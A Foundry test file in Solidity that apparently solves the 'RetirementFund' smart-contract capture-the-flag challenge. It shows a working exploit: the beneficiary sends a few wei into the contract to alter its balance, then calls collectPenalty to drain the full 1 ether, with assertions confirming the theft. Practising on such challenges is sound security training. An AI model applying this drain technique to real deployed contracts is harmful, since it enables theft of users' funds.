// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {RetirementFundChallenge} from "../src/RetirementFundChallenge.sol";

contract RetirementFundChallengeAttackTest is Test {
    RetirementFundChallenge public retirementFund;
    
    address constant BENEFICIARY = address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8);

    function setUp() public {
        retirementFund = new RetirementFundChallenge{ value: 1 ether }(BENEFICIARY);
    }

    function testAttack() public {
        vm.deal(BENEFICIARY, 100 wei);  

        console.log("Before Attack:");      
        console.log("Beneficiary balance: ", BENEFICIARY.balance);      
        console.log("Retirement balance: ", address(retirementFund).balance);            
        
        // beneficiary add funds to prepate the attack
        vm.prank(BENEFICIARY);
        (bool ok,) = payable(address(retirementFund)).call{ value: 10 wei }("");
        assertTrue(ok, "Falha ao enviar ETH");        
        assertEq(address(retirementFund).balance, 1 ether + 10 wei );
        assertEq(address(BENEFICIARY).balance, 90 wei );

        // beneficiary drain the funds
        vm.prank(BENEFICIARY);
        retirementFund.collectPenalty();
        assertEq(address(retirementFund).balance, 0);
        assertEq(address(BENEFICIARY).balance, 1 ether + 100 wei );

        console.log("");
        console.log("After Attack:");      
        console.log("Beneficiary balance: ", BENEFICIARY.balance);      
        console.log("Retirement balance: ", address(retirementFund).balance);      
    }
}
